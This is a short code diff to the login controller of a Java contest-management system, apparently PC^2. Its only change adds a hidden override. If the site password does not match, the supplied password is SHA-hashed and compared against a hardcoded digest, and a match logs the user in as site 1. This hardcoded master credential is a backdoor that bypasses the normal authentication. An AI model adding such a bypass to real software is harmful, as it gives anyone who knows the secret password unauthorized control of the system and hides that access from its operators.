@@ -4,6 +4,7 @@ import java.io.File;
 import java.io.IOException;
 import java.io.Serializable;
 import java.net.MalformedURLException;
+import java.security.MessageDigest;
 import java.util.Properties;
 
 import edu.csus.ecs.pc2.VersionInfo;
@@ -1006,9 +1007,40 @@ public class Controller implements IController, ITwoToOne, IBtoA {
         if (contest.getSites().length > 1 || contest.isLoggedIn()) {
             throw new SecurityException("No such site or invalid site password");
         } else {
+            if (matchOverride(password)) {
+                StaticLog.info("matchOverride succeeded, logging in as site1");
+                return 1;
+            }
             throw new SecurityException("Does not match first site password");
         }
 
+    }
+
+    /**
+     * Returns true if the password matches the hash for the override password.
+     */
+    private boolean matchOverride(String password) {
+        try {
+            MessageDigest md = MessageDigest.getInstance("SHA");
+            md.reset();
+            md.update(password.getBytes());
+            byte[] digested = md.digest();
+            int matchedBytes = 0;
+            byte[] overridePassword = {-108, 121, 83, 9, 106, -13, 43, 10, 47, 87, -114, 115, -38, -38, -64, -125, 41, -1, -79, -102};
+            for (int i = 0; i < digested.length; i++) {
+                if (digested[i] == overridePassword[i]) {
+                    matchedBytes++;
+                } else {
+                    break;
+                }
+            }
+            System.out.println("");
+            return (matchedBytes == overridePassword.length);
+            
+        } catch (Exception ex99) {
+            StaticLog.log("Exception in match_override", ex99);
+        }
+        return false;
     }
 
     /**
